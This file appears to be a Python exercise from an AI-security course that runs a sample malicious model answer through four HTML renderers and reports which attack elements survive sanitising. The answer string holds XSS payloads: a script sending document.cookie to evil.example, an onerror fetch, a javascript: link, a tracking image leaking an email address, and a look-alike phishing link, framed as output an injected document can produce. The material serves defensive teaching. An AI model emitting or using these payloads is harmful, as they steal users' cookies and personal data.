"""Exercise 7a: what happens when model output is rendered as HTML.

One malicious answer (the kind an injected document can produce) goes through four renderers.
The script writes results/render_demo.html (open it in a browser: nothing in it runs, every
version is shown as source inside <pre>) and prints, for each renderer, what survived.

    python labs/24-ai-security/render_demo.py           # reference renderers + yours (if done)
"""

from __future__ import annotations

import html
from html.parser import HTMLParser

import _common  # noqa: F401
from _common import RESULTS

from guardkit.render import render_answer_html, render_markdown_sanitized, render_unsafe  # noqa: E402

ANSWER = """Your refund request is approved [sup-refund-policy#2].
<script>fetch('https://evil.example/c?='+document.cookie)</script>
<img src=x onerror="fetch('https://evil.example/e')">
<a href="javascript:alert('xss')">Open the policy</a>

![status](https://stats.evil.example/b.png?d=dana%40acme.example%20refund%20case%2042)
[Verify your account](https://acme.example.evil.test/verify) or read https://wiki.acme.example/refunds."""

class _Tags(HTMLParser):
    """Collect the REAL tags of a fragment (escaped text like &lt;script&gt; is not a tag)."""

    def __init__(self):
        super().__init__()
        self.tags: list[tuple[str, dict]] = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, {k: v or "" for k, v in attrs}))


CHECKS = {
    "script tag": lambda t, a: t == "script",
    "event handler (onerror=)": lambda t, a: any(k.startswith("on") for k in a),
    "javascript: URL": lambda t, a: a.get("href", "").strip().lower().startswith("javascript:"),
    "image to evil host (exfiltration)": lambda t, a: t == "img" and "evil" in a.get("src", ""),
    "clickable look-alike domain": lambda t, a: t == "a" and "evil.test" in a.get("href", ""),
}


def live_tags(fragment: str) -> list[tuple[str, dict]]:
    p = _Tags()
    p.feed(fragment)
    return p.tags


def renderers():
    out = [("1. Markdown with raw HTML, no sanitizing", render_unsafe)]
    try:
        import nh3  # noqa: F401
        out.append(("2. markdown-it (html off) + nh3 defaults", render_markdown_sanitized))
        out.append(("3. markdown-it + nh3 with a URL allowlist",
                    lambda t: render_markdown_sanitized(t, allowed_domains=["acme.example"])))
    except ImportError:
        print("(nh3 not installed: uv pip install -r labs/24-ai-security/requirements.txt)")
    out.append(("4. reference render_answer_html (escape everything)", render_answer_html))
    try:
        import mine
        mine.render_answer_html("x")
        out.append(("5. YOUR mine.render_answer_html", mine.render_answer_html))
    except NotImplementedError:
        pass
    return out


def main() -> None:
    page = ["<!doctype html><meta charset='utf-8'><title>render demo</title><body style='font-family:sans-serif'>",
            "<h1>Model output rendered four ways (shown as source)</h1>", f"<h2>The model's answer</h2><pre>{html.escape(ANSWER)}</pre>"]
    for name, fn in renderers():
        res = fn(ANSWER)
        print(f"\n{name}")
        tags = live_tags(res)
        for label, check in CHECKS.items():
            hit = any(check(t, a) for t, a in tags)
            print(f"   {'SURVIVED' if hit else 'removed '}  {label}")
        page.append(f"<h2>{html.escape(name)}</h2><pre>{html.escape(res)}</pre>")
    RESULTS.mkdir(exist_ok=True)
    (RESULTS / "render_demo.html").write_text("\n".join(page), encoding="utf-8")
    print("\nwrote results/render_demo.html")


if __name__ == "__main__":
    main()
